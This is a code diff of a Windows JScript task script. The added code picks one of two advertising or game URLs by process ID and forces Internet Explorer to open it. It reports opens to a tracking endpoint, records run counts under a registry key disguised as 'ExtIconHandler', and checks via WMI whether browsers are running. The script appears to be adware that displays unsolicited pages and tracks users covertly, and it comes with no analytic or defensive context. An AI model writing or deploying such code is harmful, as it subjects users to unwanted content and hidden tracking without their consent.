@@ -1,12 +1,45 @@
-var __title = "http://ifengg.web.alizhufu.com/?=7000"
-//alert(0)
+var title1="http://mgtdf.bfxg400.com/?xz"
+var title2="http://www.mygame66.com/211930021.html?placeid="
+var __title = ""
 
-if (FindWindow(__title)){
+var pid = __external.GetPID();
+var tpid = pid.substr(15,1)
+var statkey = ""
+if (1==tpid){
+	__title = title1
+	statkey = "bfxg400"
+}else{
+	__title=title2
+	statkey = "mygame66"
+}
+
+var taskid = 30002
+if ( /* !FindExeInBlacklist() || */ GetTaskXRunTimes(taskid)){
 	exit(4000+1)
+	sendHttpStat("openurl", "t_"+taskid+"_exit" ,  1);  
 }
 else{
 	CreateIEObject()
+	sendHttpStat("openurl", "t_"+taskid+"_" + statkey ,  1);  
+	SetTaskXRunTimeXX(taskid)
 	exit(4000)
+}
+function GetTaskXRunTimes(taskid){
+	var regvalue = __TRY(function(){ return __wshShell.RegRead("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\"+taskid)} );
+	if(regvalue){
+		return regvalue;
+	}else{
+		return 0;
+	}
+}
+function SetTaskXRunTimeXX(taskid){
+	var regvalue = __TRY(function(){ return __wshShell.RegRead("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\t_"+taskid)} );
+	if(regvalue){
+		regvalue++;
+	}else{
+		regvalue=1;
+	}
+	__TRY(function (){__wshShell.RegWrite("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\t_"+taskid, 1, "REG_DWORD")})
 }
 function FindWindow (title){//模糊查找窗口标题
 	var find=0;
@@ -22,6 +55,26 @@ function FindWindow (title){//模糊查找窗口标题
 	}); 
 	return find	
 }
+function FindExeInBlacklist(){
+	var blacklist=["iexplore", "liebao", "Firefox",
+					"chrome"];
+	//var wql="SELECT * FROM Win32_Process" + " where 0=1";
+	
+	var wql="SELECT * FROM Win32_Process" + " where Name='AAABBBCCCDDD'";
+	for (var index in blacklist){
+		var name = blacklist[index];
+		wql += " or Name like '%" + name+"%'";	
+	}
+	
+	var process = new Enumerator (__service.ExecQuery(wql)).item();	
+	if(process){
+		log("exist process " + process.Name + "   ; wql="+wql)
+		return true;
+	}else{
+		return false;
+	}	
+}
+
 function CreateIEObject()
 {
 	var __ie = new ActiveXObject ("internetexplorer.application");
@@ -47,4 +100,5 @@ function CreateIEObject()
 		ie.visible=1
 		} 
 }
+
 
